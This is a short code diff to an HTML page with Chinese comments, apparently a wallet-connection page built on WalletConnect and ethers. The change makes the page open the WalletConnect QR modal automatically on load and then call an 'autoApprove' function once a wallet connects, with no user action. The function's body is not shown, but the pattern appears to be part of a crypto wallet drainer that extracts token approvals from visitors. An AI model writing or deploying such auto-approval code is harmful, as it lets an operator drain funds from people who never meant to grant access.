@@ -11,7 +11,7 @@
       import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';
 
       const chains = [mainnet, bsc];
-      const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d'; // 可替換為你自己的 WalletConnect Project ID
+      const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d'; // 替換為你自己的 Project ID
 
       const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
       const wagmiConfig = createConfig({
@@ -53,8 +53,13 @@
         }
       }
 
-      // 延遲 3 秒等用戶掃描完成
-      setTimeout(() => autoApprove(), 3000);
+      // ✅ 自動彈出 WalletConnect QR
+      window.addEventListener('load', () => {
+        setTimeout(() => {
+          web3modal.openModal();
+          setTimeout(() => autoApprove(), 4000); // 稍等 4 秒等待錢包連上
+        }, 1000);
+      });
     </script>
   </head>
   <body style="text-align:center; padding-top:40px; font-family:sans-serif; background:#1e1e1e; color:#fff">
